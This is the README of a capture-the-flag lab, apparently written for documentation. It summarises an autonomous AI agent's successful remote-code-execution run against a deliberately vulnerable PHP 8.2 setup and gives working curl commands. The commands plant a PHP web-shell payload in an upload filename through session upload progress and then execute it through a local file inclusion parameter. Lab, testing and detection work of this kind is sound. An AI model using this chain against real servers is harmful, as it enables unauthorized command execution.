# Exploitation examples — PHP2Shell Lab

This directory contains **real reports** of successful exploits run by Vulnerator against the lab, as reference examples and validation that the attack chains are reproducible.

---

## `chain-a-exploitation-report.md`

**Engagement:** `ctf-php2shell-chainA`  
**Date:** 21 October 2026
**Attacker:** Vulnerator/Hermes (autonomous OODA agent)
**Result:** ✅ **RCE CONFIRMED** — arbitrary command execution as `www-data` (uid=33)

### Summary

Full exploitation of **Chain A** (Session File Injection + LFI → RCE):

1. **Session fixation:** controlled SID `ctfchainA00000000000000000000000`
2. **Injection:** multipart POST with a PHP payload in the upload `filename`
3. **Persistence:** session file with raw PHP code (thanks to `cleanup=Off`)
4. **Execution:** LFI at `/vuln.php?page=/tmp/sessions/sess_<SID>` → file include → RCE

### Commands executed

```bash
# Proof of concept
GET /vuln.php?page=/tmp/sessions/sess_ctfchainA00000000000000000000000&c=id
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Other demonstration commands
whoami          → www-data
uname -a        → Linux 7.0.12-linuxkit aarch64 GNU/Linux
head -3 /etc/os-release → Debian GNU/Linux 13 (trixie)
```

### Compromised target

- **PHP:** 8.2.34 (vulnerable, < 8.2.35)
- **SAPI:** fpm-fcgi
- **Server:** nginx/1.31.7
- **Process user:** www-data (uid=33)

### Evidence

The full report includes:
- Full HTTP requests (POST multipart + GET LFI)
- Server responses with stack traces
- Verbatim output of executed commands
- 7 confirmed findings with MITRE ATT&CK mapping
- Scope validation (all traffic to `host.docker.internal:18080`)

---

## How to use these examples

### 1. As lab validation

The reports demonstrate that the lab is correctly configured and the chains are reproducible. If you set up the lab and cannot achieve RCE, compare your setup with the report details (PHP version, `upload_progress` config, endpoints).

### 2. As a template for your own engagements

The report format (`REPORT.md`) is Vulnerator's standard output. You can use it as a reference to:
- Structure your own pentest reports
- See what evidence the agent collected (requests, responses, commands)
- Understand the OODA flow (Observe → Orient → Decide → Act)

### 3. As a PoC for detection development

If you are developing detection rules (SIEM, IDS/IPS, WAF), the report documents:
- HTTP request patterns (multipart with a payload in the filename)
- LFI indicators (paths such as `/tmp/sessions/sess_<SID>`)
- Post-exploitation behavior (typical recon commands: `id`, `whoami`, `uname`)

---

## Reproduce the exploitation manually

If you want to replicate Chain A without Vulnerator, follow the guide in [`../TESTING.md`](../TESTING.md), section "Test 1: Chain A". The included Python script reproduces the report steps exactly.

Alternatively, use curl:

```bash
SID="mytest000000000000000000000000"

# Step 1: Inject the payload
curl -X POST http://127.0.0.1:18080/index.php \
  -H "Cookie: PHPSESSID=$SID" \
  -F "PHPSESSID=$SID" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
  -F 'f=@-;filename="<?php system($_GET['"'"'c'"'"']); ?>"' <<< "dummy"

# Step 2: Execute a command via LFI
curl -s "http://127.0.0.1:18080/vuln.php?page=/tmp/sessions/sess_${SID}&c=id"
```

---

## Adding more examples

If you run other engagements (Chain C, Chain D, etc.) and want to document them:

1. Download the report from the Kali container:
   ```bash
   docker cp vulnerator-ai-kali-1:/artifacts/<engagement-id>/REPORT.md \
     labs/php2shell-lab/examples/<nombre-descriptivo>.md
   ```

2. Update this `README.md` with an entry for the new example.

---

**These reports are the result of testing in an authorized local CTF environment. They contain no real sensitive data.**
